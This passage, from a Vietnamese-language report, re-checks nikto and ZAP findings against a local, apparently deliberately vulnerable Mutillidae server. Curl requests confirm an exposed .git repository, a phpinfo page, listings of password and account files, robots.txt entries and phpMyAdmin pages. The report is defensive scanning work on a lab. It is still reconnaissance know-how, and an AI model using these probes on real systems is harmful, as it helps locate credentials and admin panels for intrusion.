· url `` http://localhost:8090/.git/index `` · scanner ghi: `` GET /.git/index ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/.git/index
  200  400
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  DIRC········V��� �}0V��� �}0···a···�··��··········(!7쓡O����%�|·�k1N���··LICENSE···V��� �}0V��� �}0···a···�··��···········O|'�·�z·4h�R�1·X����· README.md·V��� �}0V��� �}0···a···�··��···········Bj'�7L·!M·���˒H���·O· index.php·V��� �}0V��� �}0···a···�··��··········9·>�7_%�-������· ͷ8�··logo.png··V��� �
```

---

## Dòng 45: Git config file found. Infos about repo details may be present.

`770c21b76c7bda7a` · nikto · scanner xếp Info
· url `` http://localhost:8090/.git/config `` · scanner ghi: `` GET /.git/config ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/.git/config
  200  272
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote "origin"] url = https://github.com/fermayo/hello-world-lamp.git fetch = +refs/heads/*:refs/remotes/origin/* [branch "master"] remote = origin merge = refs/heads/master
```

---

## Dòng 46: Information Disclosure - Sensitive Information in URL

`8e845c9c04acae16` · zap · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=f3e66299f6885b76b07c9e8396c40f0d `` · scanner ghi: `` token ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=f3e66299f6885b76b07c9e8396c40f0d
  200 text/html; charset=utf-8 37906
  số thẻ <script>: 13
  đoạn quanh bằng chứng scanner ghi: ="stylesheet" type="text/css" href="phpmyadmin.css.php?server=1&amp;lang=en&amp;token=01c62980c734c0d83bc202a90a8b742b&amp;js_frame=right&amp;nocache=6368810166" />

```

---

## Dòng 47: Information Disclosure - Suspicious Comments

`3b487b206336d5c9` · zap · scanner xếp Info
· url `` http://localhost:8090/documentation/Mutillidae-Test-Scripts.txt `` · scanner ghi: `` e exploit fails the user is going to be noti ``

```text
$ curl.exe -s http://localhost:8090/documentation/Mutillidae-Test-Scripts.txt
  200 text/plain 62239
  số thẻ <script>: 33
  đoạn quanh bằng chứng scanner ghi: o help you debug. This is not intended to be used when pen testing because if the exploit fails the user is going to be notified. */--> <form id="CSRF" method="POST" action="/index.php?page=
```

---

## Dòng 48: Modern Web Application

`90b531a64e9472ea` · zap · scanner xếp Info
· url `` http://localhost:8090/includes/main-menu.php `` · scanner ghi: `` OWASP 2017 ``

```text
$ curl.exe -s http://localhost:8090/includes/main-menu.php
  200 text/html 34343
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: e="border-color: #ffffff;border-style: solid;border-width: 1px;">
			<a href="">OWASP 2017</a>
			<ul>
				<li>
					<a href="https://www.owasp.org/images/7/72/OWASP_Top_
```

---

## Dòng 49: Non-Storable Content

`09e0c4c02475faf5` · zap · scanner xếp Info
· url `` http://localhost:8090 `` · scanner ghi: `` no-store ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090
HTTP/1.1 302 Found
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  etag: KHÔNG CÓ
  last-modified: KHÔNG CÓ
  content-type: text/html
Nội dung (150 ký tự đầu, đã bỏ thẻ HTML):
  
```

---

## Dòng 50: Obsolete Content Security Policy (CSP) Header Found

`97d6c7be5fc0ec0f` · zap · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/ `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/
  200 text/html; charset=utf-8 2740
  số thẻ <script>: 4
  đoạn quanh bằng chứng scanner ghi: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Frameset//EN"
    "http://www.w3.or
```

---

## Dòng 51: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of sy

`35c82daeb5e0116c` · nikto · scanner xếp Info
· url `` http://localhost:8090/phpinfo.php `` · scanner ghi: `` GET /phpinfo.php ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/phpinfo.php
  200 text/html 80559
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Secret PHP Server Configuration Page &nbsp; phpinfo() PHP Version 5.5.9-1ubuntu4.25 System Linux 24ed569f7218 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64 Build Date May 10 2018 14:37:08 Server API Apache 2.0 Handler Virtual Directory Support disabled 
```

---

## Dòng 52: Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.25.

`c0e6b9779987519b` · nikto · scanner xếp Info
· url `` http://localhost:8090/ `` · scanner ghi: `` GET / ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/
  302 text/html 0
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  
```

---

## Dòng 53: Session Management Response Identified

`9ae434814109c425` · zap · scanner xếp Info
· url `` http://localhost:8090 `` · scanner ghi: `` PHPSESSID ``

```text
$ curl.exe -s http://localhost:8090
  302 text/html 0
  số thẻ <script>: 0
  đoạn quanh bằng chứng scanner ghi: (không tìm thấy)
```

---

## Dòng 54: Storable and Cacheable Content

`f269ec0a9180a152` · zap · scanner xếp Info
· url `` http://localhost:8090/favicon.ico `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/favicon.ico
HTTP/1.1 404 Not Found
  cache-control: KHÔNG CÓ
  pragma: KHÔNG CÓ
  expires: KHÔNG CÓ
  etag: KHÔNG CÓ
  last-modified: KHÔNG CÓ
  content-type: text/html; charset=iso-8859-1
Nội dung (150 ký tự đầu, đã bỏ thẻ HTML):
  404 Not Found Not Found The requested URL /favicon.ico was not found on this server. Apache/2.4.7 (Ubuntu) Server at localhost Port 8090
```

---

## Dòng 55: Suggested security header missing: content-security-policy.

`eab9b629d8846b93` · nikto · scanner xếp Info
· url `` http://localhost:8090/ `` · scanner ghi: `` GET / ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/
HTTP/1.1 302 Found
  content-security-policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:24 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=do1b49sp014usd0tngmqo1g2l0; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  location: database-offline.php
  content-length: 0
  content-type: text/html
```

---

## Dòng 56: Suggested security header missing: permissions-policy.

`62dbd3c2387d9dbe` · nikto · scanner xếp Info
· url `` http://localhost:8090/ `` · scanner ghi: `` GET / ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/
HTTP/1.1 302 Found
  permissions-policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:24 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=7kh6mqp4uopgdb0tdkvsv88f67; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  location: database-offline.php
  content-length: 0
  content-type: text/html
```

---

## Dòng 57: Suggested security header missing: referrer-policy.

`97ad98b15735eb7e` · nikto · scanner xếp Info
· url `` http://localhost:8090/ `` · scanner ghi: `` GET / ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/
HTTP/1.1 302 Found
  referrer-policy: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:25 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=idjd1abtgjsfdu3tmqimkroot7; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  location: database-offline.php
  content-length: 0
  content-type: text/html
```

---

## Dòng 58: Suggested security header missing: strict-transport-security.

`1440e5e139576a18` · nikto · scanner xếp Info
· url `` http://localhost:8090/ `` · scanner ghi: `` GET / ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/
HTTP/1.1 302 Found
  strict-transport-security: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:25 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=8o5i4v6bu9f5jgce6u7e752jd7; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  location: database-offline.php
  content-length: 0
  content-type: text/html
```

---

## Dòng 59: Suggested security header missing: x-content-type-options.

`000fd7aaee188a50` · nikto · scanner xếp Info
· url `` http://localhost:8090/ `` · scanner ghi: `` GET / ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/
HTTP/1.1 302 Found
  x-content-type-options: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:26 GMT
  server: Apache/2.4.7 (Ubuntu)
  x-powered-by: PHP/5.5.9-1ubuntu4.25
  set-cookie: PHPSESSID=vr8egu7utksi8qo391td2vvsh7; path=/
  expires: Thu, 19 Nov 1981 08:52:00 GMT
  cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  pragma: no-cache
  location: database-offline.php
  content-length: 0
  content-type: text/html
```

---

## Dòng 60: The X-Content-Type-Options header is not set. This could allow the user agent to render th

`ab41431c0d7c6600` · nikto · scanner xếp Info
· url `` http://localhost:8090/robots.txt `` · scanner ghi: `` GET /robots.txt ``

```text
$ curl.exe -s -D - -o NUL http://localhost:8090/robots.txt
HTTP/1.1 200 OK
  X-Content-Type-Options: KHÔNG CÓ
Ngữ cảnh:
  giao thức: http
  số thẻ <script> trong HTML trả về: 0
  số khối <style> nội tuyến: 0, số thuộc tính style=: 0
  số <form> trong HTML trả về (không tính phần JavaScript dựng thêm sau): 0
  tài nguyên từ origin khác trong HTML: không có
Toàn bộ header:
  date: Sat, 19 Sep 2026 09:36:26 GMT
  server: Apache/2.4.7 (Ubuntu)
  last-modified: Mon, 14 May 2018 21:24:27 GMT
  etag: "be-56c311c4478c0"
  accept-ranges: bytes
  content-length: 190
  vary: Accept-Encoding
  content-type: text/plain
```

---

## Dòng 61: This might be interesting.

`d0cf5b0489bd6fa7` · nikto · scanner xếp Info
· url `` http://localhost:8090/data/ `` · scanner ghi: `` GET /data/ ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/data/
  200 text/html;charset=UTF-8 940
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Index of /data Index of /data Name Last modified Size Description Parent Directory &nbsp; - &nbsp; accounts.xml 2018-05-14 21:24 3.6K &nbsp; Apache/2.4.7 (Ubuntu) Server at localhost Port 8090
```

---

## Dòng 62: This might be interesting.

`fcc697882648c96c` · nikto · scanner xếp Info
· url `` http://localhost:8090/includes/ `` · scanner ghi: `` GET /includes/ ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/includes/
  200 text/html;charset=UTF-8 4505
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Index of /includes Index of /includes Name Last modified Size Description Parent Directory &nbsp; - &nbsp; anti-framing-protection.inc 2018-05-14 21:24 704 &nbsp; back-button.inc 2018-05-14 21:24 2.1K &nbsp; constants.php 2018-05-14 21:24 3.9K &nbsp; create-html-5-web-storage-target.inc 2018-05-14 2
```

---

## Dòng 63: This might be interesting.

`933f4e9d0fb88fbd` · nikto · scanner xếp Info
· url `` http://localhost:8090/passwords/ `` · scanner ghi: `` GET /passwords/ ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/passwords/
  200 text/html;charset=UTF-8 947
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Index of /passwords Index of /passwords Name Last modified Size Description Parent Directory &nbsp; - &nbsp; accounts.txt 2018-05-14 21:24 929 &nbsp; Apache/2.4.7 (Ubuntu) Server at localhost Port 8090
```

---

## Dòng 64: This might be interesting.

`7bc7804cc7a09777` · nikto · scanner xếp Info
· url `` http://localhost:8090/test/ `` · scanner ghi: `` GET /test/ ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/test/
  200 text/html;charset=UTF-8 937
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Index of /test Index of /test Name Last modified Size Description Parent Directory &nbsp; - &nbsp; testoutput/ 2018-05-14 21:24 - &nbsp; Apache/2.4.7 (Ubuntu) Server at localhost Port 8090
```

---

## Dòng 65: User Controllable Charset

`31de4352d2238277` · zap · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/import.php `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/import.php
  200 text/html; charset=utf-8 5587
  số thẻ <script>: 12
  đoạn quanh bằng chứng scanner ghi: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w
```

---

## Dòng 66: User Controllable HTML Element Attribute (Potential XSS)

`c7648d9a06688ec0` · zap · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=f3e66299f6885b76b07c9e8396c40f0d `` · scanner ghi: `` (trống) ``

```text
$ curl.exe -s http://localhost:8090/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=f3e66299f6885b76b07c9e8396c40f0d
  200 text/html; charset=utf-8 37906
  số thẻ <script>: 13
  đoạn quanh bằng chứng scanner ghi: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w
```

---

## Dòng 67: Webservices found.

`48c1be28ca9de43a` · nikto · scanner xếp Info
· url `` http://localhost:8090/webservices/ `` · scanner ghi: `` GET /webservices/ ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/webservices/
  200 text/html;charset=UTF-8 1319
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  Index of /webservices Index of /webservices Name Last modified Size Description Parent Directory &nbsp; - &nbsp; rest/ 2018-05-14 21:24 - &nbsp; soap/ 2018-05-14 21:24 - &nbsp; test/ 2018-05-14 21:24 - &nbsp; Apache/2.4.7 (Ubuntu) Server at localhost Port 8090
```

---

## Dòng 68: contains 8 entries which should be manually viewed.

`16cfa0418b62410a` · nikto · scanner xếp Info
· url `` http://localhost:8090/robots.txt `` · scanner ghi: `` GET /robots.txt ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/robots.txt
  200 text/plain 190
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  User-agent: * Disallow: passwords/ Disallow: config.inc Disallow: classes/ Disallow: javascript/ Disallow: owasp-esapi-php/ Disallow: documentation/ Disallow: phpmyadmin/ Disallow: includes/
```

---

## Dòng 69: phpMyAdmin directory found.

`94aab6d6dbc635af` · nikto · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/ `` · scanner ghi: `` GET /phpmyadmin/ ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/phpmyadmin/
  200 text/html; charset=utf-8 2740
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  phpMyAdmin 3.5.2.2 - localhost:8090 phpMyAdmin is more friendly with a frames-capable browser.
```

---

## Dòng 70: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authoriz

`44a64f67e0cde40e` · nikto · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/changelog.php `` · scanner ghi: `` GET /phpmyadmin/changelog.php ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/phpmyadmin/changelog.php
  200 text/html; charset=utf-8 54107
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  phpMyAdmin - ChangeLog phpMyAdmin - ChangeLog phpMyAdmin - ChangeLog ====================== 3.5.2.2 (2012-08-12) - [security] Fixed XSS vulnerabilities, see PMASA-2012-4 3.5.2.1 (2012-08-03) - [security] Fixed local path disclosure vulnerability, see PMASA-2012-3 3.5.2.0 (2012-07-07) - bug #3521416 
```

---

## Dòng 71: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authoriz

`94efc0a19ee96120` · nikto · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/ChangeLog `` · scanner ghi: `` GET /phpmyadmin/ChangeLog ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/phpmyadmin/ChangeLog
  200  27794
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  phpMyAdmin - ChangeLog ====================== 3.5.2.2 (2012-08-12) - [security] Fixed XSS vulnerabilities, see PMASA-2012-4 3.5.2.1 (2012-08-03) - [security] Fixed local path disclosure vulnerability, see PMASA-2012-3 3.5.2.0 (2012-07-07) - bug #3521416 [interface] JS error when editing index - bug 
```

---

## Dòng 72: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authoriz

`a72fb96f067edfaa` · nikto · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/Documentation.html `` · scanner ghi: `` GET /phpmyadmin/Documentation.html ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/phpmyadmin/Documentation.html
  200 text/html 257553
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  phpMyAdmin 3.5.2.2 - Documentation php MyAdmin 3.5.2.2 Documentation Top Requirements Introduction Installation Setup script Configuration Transformations FAQ Developers Copyright Credits Glossary phpMyAdmin homepage SourceForge phpMyAdmin project page Official phpMyAdmin wiki Git repositories on Gi
```

---

## Dòng 73: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authoriz

`1d5e977fa353a91e` · nikto · scanner xếp Info
· url `` http://localhost:8090/phpmyadmin/README `` · scanner ghi: `` GET /phpmyadmin/README ``

```text
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/phpmyadmin/README
  200  2101
$ curl.exe -s -o NUL -w "%{http_code} %{content_type} %{size_download}" http://localhost:8090/khong-ton-tai-xyz
  404 text/html; charset=iso-8859-1 291
Nội dung URL scanner báo (300 ký tự đầu, đã bỏ thẻ HTML):
  phpMyAdmin - Readme =================== Version 3.5.2.2 A set of PHP-scripts to manage MySQL over the web. http://www.phpmyadmin.net/ Copyright --------- Copyright (C) 1998-2000 Tobias Ratschiller Copyright (C) 2001-2012 Marc Delisle Olivier Müller Robin Johnson Alexander M. Turek Michal Čihař Garvi
```
